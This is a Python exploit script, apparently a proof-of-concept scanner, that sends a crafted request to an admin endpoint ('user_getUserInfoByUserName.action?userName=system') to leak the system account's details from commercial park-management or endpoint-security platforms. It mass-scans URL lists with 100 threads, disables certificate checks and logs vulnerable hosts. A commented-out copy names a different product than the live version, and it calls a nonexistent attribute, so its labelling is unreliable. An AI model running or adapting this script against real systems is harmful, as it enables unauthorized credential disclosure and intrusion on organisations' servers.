# import sys,argparse,requests,re
# requests.packages.urllib3.disable_warnings()
# from multiprocessing.dummy import Pool
# def banner():
#     banner = """
#              ____  ____  _     _     ____
#         /  _ \/  _ \/ \ /|/ \ /\/  _ \
#         | | \|| / \|| |_||| | ||| / \|
#         | |_/|| |-||| | ||| \_/|| |-||
#         \____/\_/ \|\_/ \|\____/\_/ \|
#
#
#
#     """
#     print(banner)
#
# def main():
#     banner()
#     parser = argparse.ArgumentParser(description="大华智慧园区管理平台任意密码读取")
#     parser.add_argument('-u', '--url', dest='url', type=str, help='Please enter your url')
#     parser.add_argument('-f', '--file', dest='file', type=str, help='Please enter your file')
#
#     args = parser.parse_args()
#     if args.url and not args.file:
#         poc(args.url)
#     elif args.file and not args.url:
#         url_list = []
#         with open(args.file, 'r', encoding='utf-8') as f:
#             for url in f.readlines():
#                 url_list.append(url.strip().replace('\n', ''))
#         mp = Pool(100)
#         mp.map(poc, url_list)
#         mp.close()
#         mp.join()
#     else:
#         print(f"Usage:\n\t python3 {sys.argv[0]} -h")
#
# def poc(target):
#     payload = '/admin/user_getUserInfoByUserName.action?userName=system'
#     headers = {
#         "User-Agent": "Mozilla/5.0(WindowsNT10.0;Win64;x64;rv:129.0)Gecko/20100101Firefox/129.0",
#         "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8",
#         "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
#         "Accept-Encoding": "gzip,deflate",
#         "Upgrade-Insecure-Requests": "1",
#         "Sec-Fetch-Dest": "document",
#         "Sec-Fetch-Mode": "navigate",
#         "Sec-Fetch-Site": "none",
#         "Sec-Fetch-User":"?1",
#         "Priority": "u=0,i",
#         "Te": "trailers",
#         "Connection": "close",
#     }
#     try:
#         res1 = requests.get(url=target+payload, headers=headers, verify=False)
#         print(res1.txt)
#     except Exception as e:
#         print(e)

import sys, argparse, requests, re

requests.packages.urllib3.disable_warnings()
from multiprocessing.dummy import Pool


def banner():
    banner = r"""
             ____  ____  _     _     ____ 
        /  _ \/  _ \/ \ /|/ \ /\/  _ \
        | | \|| / \|| |_||| | ||| / \|
        | |_/|| |-||| | ||| \_/|| |-||
        \____/\_/ \|\_/ \|\____/\_/ \|



    """
    print(banner)


def main():
    banner()
    parser = argparse.ArgumentParser(description="辰信景云终端安全漏洞扫描工具")
    parser.add_argument('-u', '--url', dest='url', type=str, help='Please enter your url')
    parser.add_argument('-f', '--file', dest='file', type=str, help='Please enter your file')

    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace('\n', ''))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")


def poc(target):
    payload = '/admin/user_getUserInfoByUserName.action?userName=system'
    headers = {
        "User-Agent": "Mozilla/5.0(WindowsNT10.0;Win64;x64;rv:129.0)Gecko/20100101Firefox/129.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8",
        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
        "Accept-Encoding": "gzip,deflate",
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-User": "?1",
        "Priority": "u=0,i",
        "Te": "trailers",
        "Connection": "close",
    }
    try:
        res1 = requests.get(url=target + payload, headers=headers, verify=False)
        if res1.status_code == 200 and 'isPasswordChanged' in res1.text:
            print(f"[+] {target} 存在漏洞")
            with open('result2.txt', 'a', encoding='utf-8') as f:
                f.write(target + '\n')
        else:
            print(f"[-] {target} 不存在漏洞")
    except Exception as e:
        print(f"[-] 该 {target} 请求失败: {e}")


if __name__ == '__main__':
    main()
